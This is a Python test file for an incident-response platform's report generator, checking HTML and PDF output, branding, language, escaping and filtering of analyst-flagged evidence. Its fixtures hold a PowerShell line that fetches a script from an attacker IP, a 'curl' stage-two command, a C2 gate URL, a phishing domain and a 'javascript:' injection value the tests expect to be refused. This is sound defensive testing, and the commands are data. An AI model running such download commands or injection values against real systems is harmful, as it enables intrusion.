"""Incident report: content, options, branding, HTML and PDF."""

from __future__ import annotations

import base64

from fastapi.testclient import TestClient

from app.core.db import SessionLocal
from app.evidence import reporting
from app.report import attack_techniques, build_html, evidence, flagged_scope
from tests.conftest import make_key

LOGO = (
    "data:image/png;base64,"
    + base64.b64encode(
        bytes.fromhex(
            "89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489"
            "0000000d4944415478da63f8cfc0f01f0005000201a3b6a6e30000000049454e44ae426082"
        )
    ).decode()
)

DOC = {
    "id": "r1",
    "name": "WKS-042",
    "host": "WKS-042",
    "username": "m.rossi",
    "os": "windows",
    "createdAt": "2026-03-01T08:00:00Z",
    "suspiciousStart": 1772503200000,
    "suspiciousEnd": 1772510400000,
    "flags": {
        "evt:Security:9126": {
            "key": "evt:Security:9126",
            "section": "eventlogs",
            "browserId": "Security",
            "title": "1102 Audit log cleared",
            "time": 1772505660000,
            "flaggedBy": "analyst",
            "comments": [{"text": "anti-forensics by <administrator>", "author": "analyst"}],
        }
    },
    "notes": [{"id": "n1", "text": "Initial access via RDP.\n\nSecond paragraph.", "author": "analyst"}],
    "data": {
        "iocs": {"manual": [{"type": "ip", "value": "185.220.101.47", "source": "reputation"}]},
        "commands": {
            "shells": {
                "powershell": {
                    "commands": [{"id": "c1", "command": "iwr http://185.220.101.47/a.ps1"}],
                    "meta": {
                        "history": {
                            "fileName": "ConsoleHost_history.txt",
                            "format": "psreadline",
                            "rows": 1,
                            "importedAt": "2026-03-04T09:00:00Z",
                            "sha256": "d" * 64,
                        }
                    },
                }
            }
        },
        "eventlogs": {
            "channels": {
                "Security": {
                    "events": [
                        {
                            "id": "evt:Security:9126",
                            "recordId": 9126,
                            "channel": "Security",
                            "computer": "WKS-042",
                            "provider": "Microsoft-Windows-Eventlog",
                            "eventId": 1102,
                            "time": 1772505660000,
                            "data": {},
                        }
                    ],
                    "meta": {"fileName": "Security.evtx", "format": "evtx", "sha256": "e" * 64, "total": 9},
                },
                "System": {
                    "events": [
                        {
                            "id": "evt:System:77",
                            "recordId": 77,
                            "channel": "System",
                            "computer": "WKS-042",
                            "eventId": 104,
                            "time": 1772505000000,
                            "data": {"Channel": "Microsoft-Windows-Sysmon/Operational"},
                        }
                    ],
                    "meta": {"fileName": "System.evtx", "format": "evtx", "sha256": "f" * 64, "total": 4},
                },
            }
        },
    },
}


def test_attack_techniques_merge_capa_yara_and_rules():
    samples = [
        {
            "fileName": "a.exe",
            "capa": [
                {
                    "name": "inject thread",
                    "attack": [{"id": "T1055", "tactic": "Defense Evasion", "technique": "Process Injection"}],
                }
            ],
            "yara": [{"rule": "pe_process_injection_apis", "meta": {"mitre_attack": "T1055"}}],
        }
    ]
    detections = [{"label": "log cleared", "count": 2, "attack": ["T1070.001", "bogus"]}]
    techniques = {t["id"]: t for t in attack_techniques(samples, detections)}
    assert set(techniques) == {"T1055", "T1070.001"}
    assert techniques["T1055"]["sources"] == [
        "capa · inject thread (a.exe)",
        "YARA · pe_process_injection_apis (a.exe)",
    ]
    assert techniques["T1070.001"]["name"] == "Indicator Removal: Clear Windows Event Logs"


def moved(admin: TestClient, doc: dict) -> tuple[dict, dict]:
    """An incident of 6.x written: its host evidence is moved to the tables. The document that is
    left and what the report reads of the tables."""
    key = make_key(admin, roles=["analyst"])
    assert admin.post("/api/incidents", headers=key, json=doc).status_code == 201
    left = admin.get(f"/api/incidents/{doc['id']}", headers=key).json()
    with SessionLocal() as db:
        return left, reporting.gather(db, doc["id"])


def test_evidence_lists_imported_files_with_hashes(admin: TestClient):
    left, host = moved(admin, {**DOC, "id": "r0"})
    assert "eventlogs" not in left["data"] and "commands" not in left["data"] and not left["flags"]
    rows = evidence(left, None, host)
    assert {r["fileName"] for r in rows} == {"ConsoleHost_history.txt", "Security.evtx", "System.evtx"}
    # Imported before 7.0: no original, so no SHA-256; the hash 6.x noted is kept aside.
    assert all(r["sha256"] == "" and r["legacy"] for r in rows)
    assert {r["fileName"]: r["known"] for r in rows}["ConsoleHost_history.txt"] == "d" * 64
    html = build_html(left, host=host, scope="all", sections=["evidence"])
    assert "not kept: imported before 7.0" in html and "d" * 64 in html and "no report: imported before 7.0" in html


def test_build_html_sections_language_and_escaping(admin: TestClient):
    left, host = moved(admin, {**DOC, "id": "r4"})
    html = build_html(
        left,
        lang="it",
        tlp="red",
        sections=["summary", "timeline", "eventlogs", "notes"],
        executive_summary="Accesso <RDP>.",
        generated_by="admin",
        generated_at="2026-03-05T10:00:00Z",
        host=host,
    )
    assert "Report dell&#x27;incidente" in html and "TLP:RED" in html
    assert "Accesso &lt;RDP&gt;." in html and "<RDP>" not in html
    assert "by &lt;administrator&gt;" in html and "anti-forensics" in html and "<administrator>" not in html
    assert "Microsoft-Windows-Sysmon/Operational" not in html.split("Registri eventi Windows")[0]
    assert "Second paragraph." in html
    # Left-out sections are absent.
    assert "Appendice delle prove" not in html and "MITRE ATT&amp;CK" not in html and "Integrità" not in html


def test_report_endpoint_html_pdf_and_branding(admin: TestClient):
    key = make_key(admin, roles=["analyst"])
    assert admin.post("/api/incidents", headers=key, json=DOC).status_code == 201
    settings = admin.get("/api/settings").json()
    settings["report"] = {"orgName": "ACME SOC", "logo": LOGO}
    assert admin.put("/api/settings", json=settings).json()["report"]["orgName"] == "ACME SOC"
    bad = {**settings, "report": {"orgName": "x", "logo": "javascript:alert(1)"}}
    assert admin.put("/api/settings", json=bad).status_code == 422

    r = admin.post(
        "/api/incidents/r1/report",
        headers=key,
        json={
            "format": "html",
            # What a client sends of detections is accepted and ignored: the tables say what was found.
            "detections": [{"id": "evt-log-cleared", "label": "log cleared", "count": 1, "attack": ["T1070.001"]}],
            "scope": "all",
        },
    )
    assert r.status_code == 200 and r.headers["content-type"].startswith("text/html")
    assert "ACME SOC" in r.text and LOGO in r.text and "T1070.001" not in r.text
    assert "185.220.101.47" in r.text  # from the IOC index
    assert "everything in the incident" in r.text and "ConsoleHost_history.txt" in r.text
    assert "Evidence integrity" in r.text and "3 files, 0 read in part, 0 failed." in r.text
    # By default only what was flagged: the indicator and the PowerShell history are not.
    flagged = admin.post("/api/incidents/r1/report", headers=key, json={"format": "html"})
    assert "what the analysts flagged" in flagged.text and "anti-forensics" in flagged.text
    assert (
        "185.220.101.47" not in flagged.text
        and "ConsoleHost_history.txt" not in flagged.text.split("Evidence integrity")[0]
    )
    assert "Security.evtx" in flagged.text.split("Evidence integrity")[0]
    assert "System.evtx" not in flagged.text.split("Evidence integrity")[0]
    assert "System.evtx" in flagged.text  # the integrity table lists every file
    without = admin.post("/api/incidents/r1/report", headers=key, json={"format": "html", "integrity": False})
    assert "Evidence integrity" not in without.text
    assert "TLP:AMBER" in r.text  # default

    # Saved per-incident settings are the defaults; the body overrides them.
    admin.patch(
        "/api/incidents/r1",
        headers=key,
        json={"report": {"lang": "it", "tlp": "green", "executiveSummary": "Sintesi salvata."}},
    )
    r = admin.post("/api/incidents/r1/report", headers=key, json={"format": "html"})
    assert "TLP:GREEN" in r.text and "Sintesi salvata." in r.text and "Report dell" in r.text

    pdf = admin.post("/api/incidents/r1/report", headers=key, json={})
    assert pdf.status_code == 200 and pdf.headers["content-type"] == "application/pdf"
    assert pdf.content.startswith(b"%PDF") and "WKS-042-report.pdf" in pdf.headers["content-disposition"]

    actions = [e["action"] for e in admin.get("/api/audit").json()["entries"]]
    assert "report.generate" in actions
    assert admin.post("/api/incidents/nope/report", headers=key, json={}).status_code == 404


SHA_A, SHA_B, MAIL = "a" * 64, "b" * 64, "c" * 64
SCOPED = {
    "id": "r2",
    "name": "scoped",
    "flags": {
        f"sample:{SHA_A}:ioc:url:http://evil.top/gate.php": {"section": "malware", "title": "gate"},
        "ioc:ip:185.220.101.47": {"section": "iocs", "title": "185.220.101.47"},
        "ioc:domain:not-indexed.example": {"section": "iocs", "title": "not-indexed.example"},
        f"mail:{MAIL}": {"section": "mail", "title": "Your account"},
        "pcap:" + "1" * 32 + ":6": {"section": "network", "title": "GET /signin"},
        "url:" + "2" * 32: {"section": "urls", "title": "login-paypa1.top"},
    },
    "data": {
        "malware": {
            "samples": [
                {"sha256": SHA_A, "fileName": "flagged.exe", "importedAt": "2026-03-04T09:00:00Z"},
                {"sha256": SHA_B, "fileName": "ignored.exe", "importedAt": "2026-03-04T09:00:00Z"},
            ]
        },
        "mail": {"messages": [{"sha256": MAIL, "fileName": "reported.eml", "subject": "Your account"}]},
        "network": {
            "captures": [
                {"id": "1" * 32, "fileName": "flagged.pcapng", "sha256": "9" * 64, "packets": 67},
                {"id": "3" * 32, "fileName": "ignored.pcapng", "sha256": "8" * 64, "packets": 5},
            ]
        },
        "urls": {
            "scans": [
                {"id": "2" * 32, "url": "https://login-paypa1.top/signin", "verdict": "phishing", "score": 90},
                {"id": "4" * 32, "url": "https://ignored.example/", "verdict": "clean", "score": 0},
            ]
        },
    },
}


def a_source(identity: str, kind: str, source: str, name: str, sha256: str, **more) -> dict:
    """A file of host evidence as ``reporting.sources`` gives it."""
    return {
        "id": identity,
        "kind": kind,
        "source": source,
        "profile": "",
        "file_name": name,
        "sha256": sha256,
        "parser": "bash",
        "parser_version": "1",
        "state": "done",
        "legacy": False,
        "read": "complete",
        "in_file": 3,
        "read_count": 3,
        "kept": 3,
        "duplicates": 0,
        "skipped": 0,
        "created_at": "2026-03-04T09:00:00Z",
        "report": {},
        "error": None,
        "seen_by": None,
        "seen_at": None,
        "seen_note": "",
        **more,
    }


HOST = {
    "sources": [
        a_source("s-bash", "commands", "bash", "bash_history", "5" * 64),
        a_source("s-zsh", "commands", "zsh", "zsh_history", "6" * 64),
    ],
    "flagged": {
        "records": [
            {
                "key": "k1",
                "time": 1772505660000,
                "kind": "commands",
                "type": "command",
                "summary": "curl http://x",
                "channel": "",
                "file": "bash_history",
                "note": "stage two",
                "by": "elena",
            }
        ],
        "total": 1,
        "sources": {"s-bash"},
        "channels": set(),
    },
    "channels": [],
    "cleared": {},
    "detections": [],
}


def test_flagged_scope_reads_the_flag_keys_and_the_marks():
    scope = flagged_scope(SCOPED, HOST)
    assert scope["samples"] == {SHA_A} and scope["mails"] == {MAIL}
    assert scope["captures"] == {"1" * 32} and scope["urls"] == {"2" * 32}
    assert scope["iocs"] == {
        ("url", "http://evil.top/gate.php"),
        ("ip", "185.220.101.47"),
        ("domain", "not-indexed.example"),
    }
    assert scope["sources"] == {"s-bash"} and scope["channels"] == set()
    assert flagged_scope(SCOPED)["sources"] == set()


def test_report_lists_only_what_was_flagged_unless_asked_for_everything():
    samples = [
        {"sha256": SHA_A, "fileName": "flagged.exe", "yara": [], "capa": None},
        {"sha256": SHA_B, "fileName": "ignored.exe", "yara": [], "capa": None},
    ]
    iocs = [
        {"type": "ip", "value": "185.220.101.47", "sources": ["commands:bash"], "otherIncidents": 2},
        {"type": "domain", "value": "never-flagged.example", "sources": ["commands:bash"], "otherIncidents": 0},
    ]
    html = build_html(
        SCOPED, samples=samples, iocs=iocs, mails=[{"sha256": MAIL, "subject": "Your account"}], host=HOST
    )
    for shown in ("flagged.exe", "185.220.101.47", "not-indexed.example", "flagged.pcapng", "login-paypa1.top"):
        assert shown in html, shown
    for hidden in ("ignored.exe", "never-flagged.example", "ignored.pcapng", "ignored.example"):
        assert hidden not in html, hidden
    # The integrity table lists every file, flagged or not; the appendix only the ones that hold a flag.
    assert (
        "zsh_history" in html.split("Evidence integrity")[1]
        and "zsh_history" not in html.split("Evidence integrity")[0]
    )
    assert "bash_history" in html and "Your account" in html
    assert "curl http://x" in html and "stage two" in html and "elena" in html
    assert "what the analysts flagged" in html

    everything = build_html(SCOPED, samples=samples, iocs=iocs, scope="all", host=HOST)
    for shown in ("ignored.exe", "never-flagged.example", "ignored.pcapng", "ignored.example", "zsh_history"):
        assert shown in everything, shown
    # Nothing flagged: the sections say so instead of listing everything.
    empty = build_html(
        {"id": "r3", "name": "empty", "data": SCOPED["data"]}, samples=samples, iocs=iocs, host={**HOST, "flagged": {}}
    )
    assert "Nothing was flagged here." in empty and "flagged.exe" not in empty
    assert {r["fileName"] for r in evidence(SCOPED, flagged_scope(SCOPED, HOST), HOST)} == {
        "flagged.exe",
        "reported.eml",
        "flagged.pcapng",
        "bash_history",
    }


def test_report_states_the_status_and_the_assignee():
    html = build_html({**DOC, "status": "in_progress", "assignee": "anna"})
    assert "<dt>Status</dt><dd>in progress</dd>" in html
    assert "<dt>Assigned to</dt><dd>anna</dd>" in html
    plain = build_html(DOC, lang="it")
    assert "<dt>Stato</dt><dd>aperto</dd>" in plain
    assert "Assegnato a" not in plain
